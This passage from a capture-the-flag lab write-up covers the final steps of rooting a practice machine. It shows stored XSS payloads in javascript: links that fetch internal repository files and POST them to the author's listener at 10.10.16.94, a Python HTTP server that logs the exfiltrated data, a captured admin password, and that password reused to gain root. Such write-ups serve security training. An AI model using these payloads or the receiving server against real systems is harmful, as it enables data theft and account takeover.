class="n">administrator</span><span class="o">/</span><span class="n">Employee</span><span class="o">-</span><span class="n">management</span><span class="o">/</span><span class="p">.</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="n">addition</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">consult</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">README</span><span class="w"> </span><span class="k">file</span><span class="p">,</span><span class="w"> </span><span class="n">highlighting</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">important</span><span class="w"> </span><span class="n">details</span><span class="p">,</span><span class="w"> </span><span class="k">at</span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">administrator</span><span class="o">/</span><span class="n">Employee</span><span class="o">-</span><span class="n">management</span><span class="o">/</span><span class="n">raw</span><span class="o">/</span><span class="n">branch</span><span class="o">/</span><span class="n">main</span><span class="o">/</span><span class="n">README</span><span class="p">.</span><span class="n">md</span><span class="p">.</span>
+</code></pre></div>
+
+<p>I cannot reach the <code>Employee-Management</code> repo, but with XSS, I may be able to redirect whoever will check the mail to the endpoint and capture its contents. </p>
+<p><code>&lt;a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(r=&gt;r.text()).then(d=&gt;fetch('http://10.10.16.94:8000',{method:'POST',body:d}))"&gt;View README&lt;/a&gt;</code></p>
+<p>(Note: To make this work, a file needs to be created in the repo. Contents do not matter, but without a file, there will be no response.)</p>
+<p>Since this payload will attempt to POST data to my python server, I need to modify it a little. Regular python server does not support POST requests.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">BaseHTTPRequestHandler</span><span class="p">,</span><span class="w"> </span><span class="n">HTTPServer</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">XSSHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+<span class="w">    </span><span class="k">def</span><span class="w"> </span><span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="n">content_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Content-Length&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span>
+<span class="w">        </span><span class="n">post_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+
+<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] Received POST data:&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="n">post_data</span><span class="p">)</span>
+
+<span class="w">        </span><span class="c1"># Optional: Save to file</span>
+<span class="w">        </span><span class="k">with</span><span class="w"> </span><span class="nb">open</span><span class="p">(</span><span class="s2">&quot;exfiltrated.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;a&quot;</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">f</span><span class="p">:</span>
+<span class="w">            </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">post_data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;OK&quot;</span><span class="p">)</span>
+
+<span class="w">    </span><span class="k">def</span><span class="w"> </span><span class="nf">log_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="nb">format</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+<span class="w">        </span><span class="k">return</span><span class="w">  </span><span class="c1"># Suppress default logging for cleaner output</span>
+
+<span class="k">if</span><span class="w"> </span><span class="vm">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+<span class="w">    </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0.0.0.0&quot;</span>
+<span class="w">    </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">8000</span>
+<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Listening on http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">httpd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HTTPServer</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">),</span><span class="w"> </span><span class="n">XSSHandler</span><span class="p">)</span>
+<span class="w">    </span><span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre></div>
+
+<p><img alt="success" src="../images/Cat/success.png" /></p>
+<p>I have succesfully received the README.md file, but it did not tell me anything useful.</p>
+<p>Since this is a PHP website, the endpoint probably has an <code>index.php</code> file. I will try grabbing that next.</p>
+<p><code>&lt;a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r=&gt;r.text()).then(d=&gt;fetch('http://10.10.16.94:8000',{method:'POST',body:d}))"&gt;View README&lt;/a&gt;</code></p>
+<p><img alt="password" src="../images/Cat/password.png" /></p>
+<p><code>admin | IKw75eR0MR7CMIxhH0</code></p>
+<p>The admin was successfully redirected to the dashboard, and entered their credentials. I tried logging into the machine as Jobert, but the credentials did not work.</p>
+<p><img alt="fail" src="../images/Cat/fail.png" /></p>
+<p>However, they weren't useless at all as they did work for the root user.</p>
+<p><img alt="root" src="../images/Cat/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
